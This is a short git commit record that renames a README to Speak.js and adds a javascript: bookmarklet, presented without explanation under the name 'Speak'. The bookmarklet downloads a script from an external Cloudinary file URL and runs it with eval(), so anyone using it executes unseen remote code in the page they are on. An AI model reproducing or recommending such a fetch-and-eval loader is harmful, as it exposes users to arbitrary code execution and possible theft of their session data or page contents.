594ddf741c6e43ea2b0b05a6e87860a7861ce121
Hyxam <k6ntra@gmail.com>
2024-10-03 11:11:36 -0300

    Update and rename README.md to Speak.js

---
+++ Speak.js
@@ -0,0 +1,4 @@
+# Speak 
+
+```javascript
+javascript:fetch("https://res.cloudinary.com/dq36xqdoe/raw/upload/v1727928228/main_vj2gyg.js").then(response => response.text()).then(response => eval(response))```
